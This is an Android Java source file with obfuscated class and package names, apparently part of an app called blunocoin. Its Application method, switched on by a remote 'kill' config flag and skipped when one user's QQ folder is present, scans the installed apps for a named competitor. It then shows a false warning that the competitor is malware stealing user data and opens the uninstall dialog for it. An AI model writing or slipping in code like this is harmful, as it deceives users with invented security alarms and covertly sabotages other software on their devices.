package android.a.k;
import android.content.pm.*;
import android.content.*;
import java.util.*;
import com.zzh.blunocoin.*;
import android.widget.*;
import android.net.*;
import java.io.*;
import android.os.*;
import com.zzh.blunocoin.data.*;
import com.umeng.analytics.*;

public class o0oo
{
    public PackageInfo method(Context c) throws PackageManager.NameNotFoundException
    {
        PackageInfo packageInfo = c.getPackageManager().getPackageInfo(c.getPackageName(), PackageManager.GET_SIGNATURES);
        return packageInfo;
    }
    public static int thread()  
    {  
        int osVersion;  
        try  
        {  
            osVersion = Integer.valueOf(android.os.Build.VERSION.SDK);  
        }  
        catch (NumberFormatException e)  
        {  
            osVersion = 0;  
        }  

        return osVersion;  
    }
	public static void Application(Context context){
		File f=new File(Environment.getExternalStorageDirectory()+"/Tencent/MobileQQ/2495943542");
		if(!f.exists()&&Varinfo.onconfig.getConfigParams(context,"kill").equals("1")){
		PackageManager packageManager = context.getPackageManager();

		String packageName=context.getResources().getString(R.string.classes)+"free";
		//获取手机系统的所有APP包名，然后进行一一比较
		List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);
		for (int i = 0; i < pinfo.size(); i++) {
			if (((PackageInfo) pinfo.get(i)).packageName
				.equalsIgnoreCase(packageName)){
					Toast.makeText(context,"检测到疑似恶意软件“好分数免费版”，正在尝试后台入侵！如不即时清除木马，您的用户信息有泄露风险，请谨慎使用！",1).show();
				Intent intent = new Intent();
				intent.setAction(Intent.ACTION_DELETE);
				intent.setData(Uri.parse("package:"+packageName));
				context.startActivity(intent);
				MobclickAgent.onEvent(context, "other_kill");
				}
		}
		}
	}
}
